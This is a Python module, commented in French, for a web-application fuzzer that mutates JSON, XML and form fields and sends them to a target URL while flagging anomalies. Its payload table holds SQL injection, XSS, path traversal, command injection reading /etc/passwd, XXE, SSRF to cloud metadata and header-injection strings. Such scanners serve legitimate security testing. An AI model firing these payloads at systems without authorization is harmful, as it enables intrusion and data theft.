"""Fuzzer structurel — mutation intelligente par type de contenu.

Contrairement au fuzzer paramétrique classique :
- Parse la structure du body (JSON, XML, form-data)
- Mutate chaque champ avec des payloads adaptés au type
- Détecte les anomalies dans la réponse

Supporte : JSON, XML, multipart/form-data, URL-encoded
"""

import asyncio
import copy
import json
import re
import xml.etree.ElementTree as ET
from dataclasses import dataclass
from enum import StrEnum
from typing import Any

import httpx

from decepticon.navmax.core.logging import get_logger

logger = get_logger(__name__)


class ContentType(StrEnum):
    JSON = "json"
    XML = "xml"
    FORM_URLENCODED = "form_urlencoded"
    FORM_MULTIPART = "form_multipart"


@dataclass
class MutationPoint:
    """Un point de mutation dans un body structuré."""

    path: str  # Chemin JSON (ex: "user.email") ou XPath simplifié
    original_value: Any
    value_type: str  # "string", "number", "boolean", "null", "object", "array"
    parent_type: str  # "object", "array", "root"


@dataclass
class MutationResult:
    """Résultat d'une mutation."""

    injection_point: str
    payload: str
    payload_category: str
    request_body: str
    response_status: int
    response_body_snippet: str
    anomaly: str | None = None
    evidence: str | None = None


@dataclass
class StructuralFuzzReport:
    """Rapport de fuzzing structurel."""

    url: str
    content_type: str
    mutation_points: int
    mutations_tested: int
    anomalies: list[MutationResult]
    duration_ms: float = 0


# ---------------------------------------------------------------------------
# Payloads par type de vulnérabilité
# ---------------------------------------------------------------------------
STRUCTURAL_PAYLOADS: dict[str, list[str]] = {
    "string_injection": [
        "' OR '1'='1",
        '" OR "1"="1',
        "'; DROP TABLE users--",
        "${7*7}",
        "{{7*7}}",
        "<script>alert(1)</script>",
        "1; DROP TABLE users",
        "__proto__[test]=injected",
        "../../../../etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "| cat /etc/passwd",
        "& ping -c 5 127.0.0.1 &",
        "xxe_placeholder",  # Sera remplacé par un vrai payload XXE
    ],
    "number_injection": [
        "-1",
        "0",
        "9999999999",
        "1e100",
        "NaN",
        "Infinity",
        "1 OR 1=1",
        "1; DROP TABLE users--",
        "1 UNION SELECT 1,2,3--",
        "-1.7976931348623157E+308",  # Overflow float
    ],
    "boolean_injection": [
        "true",
        "false",
        "1",
        "0",
        "null",
        '"true"',
    ],
    "null_injection": [
        '"string"',
        "0",
        "false",
        "[]",
        "{}",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/"> %xxe;]>',
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:8080/admin",
        "http://localhost:6379/",  # Redis
        "file:///etc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${application}",
    ],
    "header_injection": [
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-Host: evil.com",
        "Host: evil.com",
    ],
}


class StructuralFuzzer:
    """Fuzzer qui parse le body de la requête et le mute champ par champ.

    Usage:
        fuzzer = StructuralFuzzer()
        report = await fuzzer.fuzz("https://api.target.com/users", {
            "name": "test",
            "email": "test@test.com",
            "age": 25
        }, content_type="json")
    """

    def __init__(
        self,
        concurrency: int = 5,
        timeout: float = 10.0,
        categories: list[str] | None = None,
    ) -> None:
        self.concurrency = concurrency
        self.timeout = timeout
        self.categories = categories or ["string_injection", "number_injection", "ssrf"]
        self._semaphore = asyncio.Semaphore(concurrency)

    # ------------------------------------------------------------------
    # Parsing
    # ------------------------------------------------------------------
    def parse_json(self, data: Any, path: str = "$") -> list[MutationPoint]:
        """Parse un objet JSON et extrait les points de mutation."""
        points: list[MutationPoint] = []

        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}"
                if isinstance(value, str):
                    points.append(MutationPoint(current_path, value, "string", "object"))
                elif isinstance(value, (int, float)):
                    points.append(MutationPoint(current_path, value, "number", "object"))
                elif isinstance(value, bool):
                    points.append(MutationPoint(current_path, value, "boolean", "object"))
                elif value is None:
                    points.append(MutationPoint(current_path, value, "null", "object"))
                elif isinstance(value, (dict, list)):
                    points.extend(self.parse_json(value, current_path))

        elif isinstance(data, list):
            for i, item in enumerate(data):
                current_path = f"{path}[{i}]"
                if isinstance(item, str):
                    points.append(MutationPoint(current_path, item, "string", "array"))
                elif isinstance(item, (int, float)):
                    points.append(MutationPoint(current_path, item, "number", "array"))
                elif isinstance(item, (dict, list)):
                    points.extend(self.parse_json(item, current_path))

        return points

    def parse_xml(self, xml_str: str, path: str = "") -> list[MutationPoint]:
        """Parse un document XML et extrait les points de mutation."""
        points: list[MutationPoint] = []
        try:
            root = ET.fromstring(xml_str)
            points.extend(self._parse_xml_element(root, path))
        except ET.ParseError:
            pass
        return points

    def _parse_xml_element(self, elem: ET.Element, path: str) -> list[MutationPoint]:
        points: list[MutationPoint] = []
        current_path = f"{path}/{elem.tag.split('}')[-1]}" if path else elem.tag.split("}")[-1]

        if elem.text and elem.text.strip():
            points.append(MutationPoint(current_path, elem.text.strip(), "string", "element"))

        for child in elem:
            points.extend(self._parse_xml_element(child, current_path))

        return points

    # ------------------------------------------------------------------
    # Mutation
    # ------------------------------------------------------------------
    def mutate_json(
        self, original: Any, point: MutationPoint, payload: str, value_type: str,
    ) -> Any:
        """Applique une mutation à un point spécifique d'un objet JSON."""
        mutated = copy.deepcopy(original)
        path_parts = point.path.replace("$", "").lstrip(".").split(".")

        current = mutated
        for i, part in enumerate(path_parts):
            # Gérer les index de tableau
            array_match = re.match(r"(.+)\[(\d+)\]", part)
            if array_match:
                key = array_match.group(1)
                idx = int(array_match.group(2))
                if isinstance(current, dict) and key in current:
                    current = current[key]
                if isinstance(current, list) and idx < len(current):
                    current = current[idx]
            elif isinstance(current, dict) and part in current:
                if i == len(path_parts) - 1:
                    # Dernier niveau: appliquer la mutation
                    if value_type == "string":
                        current[part] = payload
                    elif value_type == "number":
                        try:
                            current[part] = float(payload) if "." in payload else int(payload)
                        except ValueError:
                            current[part] = payload
                    elif value_type == "boolean":
                        current[part] = payload.lower() in ("true", "1")
                    elif value_type == "null":
                        current[part] = payload
                    return mutated
                current = current[part]

        return mutated

    # ------------------------------------------------------------------
    # Core
    # ------------------------------------------------------------------
    async def _test_mutation(
        self,
        url: str,
        method: str,
        body: str,
        content_type: str,
        headers: dict[str, str],
        point: MutationPoint,
        payload: str,
        category: str,
    ) -> MutationResult | None:
        """Teste une mutation contre la cible."""
        async with self._semaphore:
            try:
                if content_type == "json":
                    parsed = json.loads(body)
                    mutated = self.mutate_json(parsed, point, payload, point.value_type)
                    mutated_body = json.dumps(mutated)
                elif content_type == "xml":
                    mutated_body = body.replace(str(point.original_value), payload, 1)
                else:
                    mutated_body = body.replace(str(point.original_value), payload, 1)

                async with httpx.AsyncClient(timeout=self.timeout) as client:
                    resp = await client.request(
                        method,
                        url,
                        content=mutated_body,
                        headers=headers,
                    )
                    snippet = resp.text[:500]
                    anomaly = None
                    evidence = None

                    # Détection d'anomalies
                    if resp.status_code >= 500:
                        anomaly = f"Erreur serveur (status={resp.status_code})"
                        evidence = snippet[:200]
                    elif "error" in snippet.lower() and "sql" in snippet.lower():
                        anomaly = "Possible SQL injection"
                        evidence = snippet[:200]
                    elif payload in snippet:
                        anomaly = "Payload reflété dans la réponse"
                        evidence = snippet[:200]
                    elif "root:" in snippet:
                        anomaly = "Possible lecture fichier système"
                        evidence = snippet[:200]
                    elif resp.status_code == 200 and resp.elapsed.total_seconds() > 5:
                        anomaly = f"Réponse lente ({resp.elapsed.total_seconds():.1f}s) — possible time-based injection"
                        evidence = f"Temps: {resp.elapsed.total_seconds():.1f}s"

                    return MutationResult(
                        injection_point=point.path,
                        payload=payload,
                        payload_category=category,
                        request_body=mutated_body[:500],
                        response_status=resp.status_code,
                        response_body_snippet=snippet,
                        anomaly=anomaly,
                        evidence=evidence,
                    )
            except Exception as e:
                return MutationResult(
                    injection_point=point.path,
                    payload=payload,
                    payload_category=category,
                    request_body="",
                    response_status=0,
                    response_body_snippet="",
                    anomaly=f"Erreur: {e}",
                )

    async def fuzz(
        self,
        url: str,
        body: Any,
        method: str = "POST",
        content_type: str = "json",
        extra_headers: dict[str, str] | None = None,
    ) -> StructuralFuzzReport:
        """Lance le fuzzing structurel.

        Args:
            url: URL cible
            body: Body à muter (dict pour JSON, str pour XML/autres)
            method: Méthode HTTP
            content_type: Type de contenu (json, xml, form_urlencoded, form_multipart)
            extra_headers: Headers additionnels

        Returns:
            StructuralFuzzReport avec les anomalies détectées

        """
        import time

        start = time.time()

        # Headers par défaut
        headers = {"User-Agent": "NavMAX-Fuzzer/1.0", **(extra_headers or {})}
        if content_type == "json":
            headers["Content-Type"] = "application/json"
            body_str = json.dumps(body) if isinstance(body, dict) else str(body)
        elif content_type == "xml":
            headers["Content-Type"] = "application/xml"
            body_str = str(body)
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            body_str = str(body)

        # Parser
        if content_type == "json":
            points = self.parse_json(body)
        elif content_type == "xml":
            points = self.parse_xml(body_str)
        else:
            points = []

            # Fallback: chercher les paires clé=valeur
            for m in re.finditer(r"([^&=]+)=([^&]*)", body_str):
                points.append(MutationPoint(m.group(1), m.group(2), "string", "form"))

        # Sélectionner les payloads pertinents
        all_payloads: list[tuple[str, str]] = []
        for point in points:
            if point.value_type == "string":
                cats = ["string_injection", "ssrf", "ssti"]
            elif point.value_type == "number":
                cats = ["number_injection"]
            elif point.value_type == "boolean":
                cats = ["boolean_injection"]
            elif point.value_type == "null":
                cats = ["null_injection"]
            else:
                cats = ["string_injection"]

            for cat in cats:
                if cat not in self.categories:
                    continue
                for payload in STRUCTURAL_PAYLOADS.get(cat, [])[:5]:
                    all_payloads.append((cat, payload, point))

        # Exécuter les mutations
        tasks = []
        for cat, payload, point in all_payloads:
            tasks.append(
                self._test_mutation(
                    url, method, body_str, content_type, headers, point, payload, cat,
                ),
            )

        results = await asyncio.gather(*tasks)
        mutation_results = [r for r in results if r is not None]
        anomalies = [r for r in mutation_results if r.anomaly]

        elapsed = (time.time() - start) * 1000

        return StructuralFuzzReport(
            url=url,
            content_type=content_type,
            mutation_points=len(points),
            mutations_tested=len(mutation_results),
            anomalies=anomalies,
            duration_ms=elapsed,
        )
